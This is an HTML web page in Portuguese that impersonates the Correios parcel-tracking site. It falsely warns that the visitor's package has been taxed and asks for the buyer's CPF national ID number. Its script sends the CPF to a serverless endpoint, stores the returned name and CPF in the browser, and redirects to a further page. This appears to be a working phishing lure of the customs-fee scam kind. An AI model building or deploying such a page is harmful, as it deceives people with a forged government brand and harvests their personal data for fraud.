<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Correios | Rastreamento</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Inter', Arial, sans-serif; background: #f5f5f5; color: #333; min-height: 100vh; }
    .header { background: #e8e8e8; padding: 8px 16px; font-size: 14px; border-bottom: 1px solid #fff; }
    .nav { background: #d4d4d4; padding: 12px 16px; display: flex; align-items: center; border-bottom: 2px solid #ffc40c; min-height: 48px; }
    .nav-logo { flex: 1; text-align: center; }
    .nav-logo img { height: 25px; }
    .nav-login { color: #005176; font-weight: 600; text-decoration: none; padding: 4px 12px; border-left: 1px solid #6c757d; }
    .breadcrumb { max-width: 1000px; margin: 16px auto; padding: 0 16px; font-size: 14px; color: #005176; }
    .breadcrumb i { margin: 0 8px; font-size: 12px; }
    main { max-width: 1000px; margin: 0 auto; padding: 24px 16px; }
    h1 { font-size: 24px; color: #003366; font-weight: 700; margin-bottom: 24px; }
    .alert-danger { background: #f8d7da; color: #721c24; padding: 16px; border-radius: 4px; font-weight: 700; margin-bottom: 24px; display: flex; align-items: center; gap: 8px; }
    .alert-danger i { font-size: 20px; }
    .form-section { background: #fff; padding: 24px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); margin-bottom: 24px; }
    .form-section h4 { color: #003366; font-size: 18px; margin-bottom: 16px; }
    .form-section p { color: #555; margin-bottom: 16px; font-size: 15px; }
    .form-group { margin-bottom: 16px; }
    .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: #333; }
    .form-group input { width: 100%; max-width: 280px; padding: 12px 16px; font-size: 16px; border: 1px solid #ccc; border-radius: 6px; }
    .form-group input:focus { outline: none; border-color: #0071ad; box-shadow: 0 0 0 2px rgba(0,113,173,0.2); }
    .btn-consultar { background: #0071ad; color: #fff; border: none; padding: 12px 32px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; }
    .btn-consultar:hover { background: #005a8a; }
    .btn-consultar:disabled { background: #ccc; cursor: not-allowed; }
    .footer-banner { background: linear-gradient(135deg, #0071ad 0%, #005a8a 100%); color: #fff; padding: 24px; text-align: center; margin-top: 32px; border-radius: 8px; }
    .footer-banner h3 { font-size: 18px; margin-bottom: 8px; }
    .footer-banner p { font-size: 14px; opacity: 0.95; }
    .error-msg { color: #dc3545; font-size: 14px; margin-top: 8px; display: none; }
    .loading { display: none; }
  </style>
</head>
<body>
  <header class="header">Acessibilidade <i class="fas fa-caret-down"></i></header>
  <nav class="nav">
    <div style="width:50px"><i class="fas fa-bars" style="font-size:20px;color:#005176"></i></div>
    <div class="nav-logo">
      <span style="color:#ffc40c;font-weight:bold;font-size:20px">Correios</span>
    </div>
    <a href="#" class="nav-login"><i class="fas fa-user"></i> Entrar</a>
  </nav>

  <nav class="breadcrumb">
    <span>Portal Correios</span><i class="fas fa-angle-right"></i>
    <span>Rastreamento</span>
  </nav>

  <main>
    <h1>Rastreamento</h1>
    
    <div class="alert-danger">
      <i class="fas fa-exclamation-triangle"></i>
      A SUA ENCOMENDA FOI TRIBUTADA!
    </div>

    <section class="form-section">
      <h4>Deseja acompanhar seu objeto?</h4>
      <p>Digite o CPF do comprador.</p>
      <form id="formCpf" onsubmit="consultarCpf(event)">
        <div class="form-group">
          <label for="cpf">CPF</label>
          <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14" required>
          <span class="error-msg" id="errorMsg">CPF inválido. Digite 11 dígitos.</span>
        </div>
        <button type="submit" class="btn-consultar" id="btnConsultar">Consultar</button>
      </form>
    </section>

    <div class="footer-banner">
      <h3>O Natal está chegando! Comece a garantir os presentes</h3>
      <p>Consulte o rastreamento da sua encomenda</p>
    </div>
  </main>

  <script>
    function formatarCpf(val) {
      val = val.replace(/\D/g, '');
      if (val.length > 11) val = val.slice(0, 11);
      return val.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4').replace(/(\d{3})(\d{3})(\d{3})$/, '$1.$2.$3');
    }
    document.getElementById('cpf').addEventListener('input', function(e) {
      e.target.value = formatarCpf(e.target.value);
      document.getElementById('errorMsg').style.display = 'none';
    });

    function consultarCpf(e) {
      e.preventDefault();
      const input = document.getElementById('cpf');
      const cpf = input.value.replace(/\D/g, '');
      const btn = document.getElementById('btnConsultar');
      const err = document.getElementById('errorMsg');

      if (cpf.length !== 11) {
        err.style.display = 'block';
        return;
      }
      err.style.display = 'none';
      btn.disabled = true;
      btn.textContent = 'Consultando...';

      fetch('/.netlify/functions/api', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cpf: cpf, nome: '' })
      })
      .then(r => r.json())
      .then(data => {
        if (data.success) {
          const nome = encodeURIComponent(data.nome || '');
          localStorage.setItem('cpf', data.cpf || cpf);
          localStorage.setItem('nome', data.nome || '');
          window.location.href = '/app/index.html?cpf=' + cpf + '&nome=' + nome;
        } else {
          err.textContent = data.message || 'Erro ao consultar. Tente novamente.';
          err.style.display = 'block';
          btn.disabled = false;
          btn.textContent = 'Consultar';
        }
      })
      .catch(() => {
        err.textContent = 'Erro de conexão. Verifique sua internet e tente novamente.';
        err.style.display = 'block';
        btn.disabled = false;
        btn.textContent = 'Consultar';
      });
    }
  </script>
</body>
</html>
